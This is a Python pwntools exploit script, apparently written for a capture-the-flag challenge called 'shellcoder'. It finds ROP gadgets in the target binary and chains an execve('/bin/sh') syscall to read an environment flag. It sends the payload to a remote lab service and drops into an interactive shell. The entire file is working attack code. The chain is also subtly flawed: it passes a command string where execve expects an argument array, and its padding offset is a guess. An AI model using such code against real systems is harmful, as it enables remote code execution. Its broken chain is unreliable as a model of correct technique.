from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# Load the binary
binary = ELF('/workspaces/cyberchallenge/jeopardy2024/shellcoder/shellcoder/build/shellcoder')
rop = ROP(binary)

# Attempt to find useful gadgets
try:
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
except TypeError:
    print("Gadget 'pop rax; ret' not found.")
    pop_rax = None

try:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
except TypeError:
    print("Gadget 'pop rdi; ret' not found.")
    pop_rdi = None

try:
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
except TypeError:
    print("Gadget 'pop rsi; ret' not found.")
    pop_rsi = None

try:
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
except TypeError:
    print("Gadget 'pop rdx; ret' not found.")
    pop_rdx = None

try:
    syscall = rop.find_gadget(['syscall', 'ret'])[0]
except TypeError:
    print("Gadget 'syscall; ret' not found.")
    syscall = None

# Check if all gadgets were found
if not all([pop_rax, pop_rdi, pop_rsi, pop_rdx, syscall]):
    print("Not all required gadgets were found. Please check the binary or use alternative methods.")
else:
    # Addresses
    bin_sh_addr = next(binary.search(b'/bin/sh\x00'))
    flag_cmd_addr = next(binary.search(b'printenv FLAG\x00'))

    # Construct the payload
    payload = flat(
        asm('nop') * 40,  # Adjust the offset as necessary
        pop_rax, 59,  # rax = 59 (sys_execve)
        pop_rdi, bin_sh_addr,  # rdi = address of "/bin/sh"
        pop_rsi, flag_cmd_addr,  # rsi = address of "printenv FLAG"
        pop_rdx, 0x0,  # rdx = 0 (NULL)
        syscall  # Trigger syscall
    )

    # Send the payload to the service
    io = remote('192.168.100.3', 38201)
    io.recvline()
    io.sendline(f'{len(payload)}'.encode())
    io.recvline()
    io.sendline(payload)
    io.interactive()
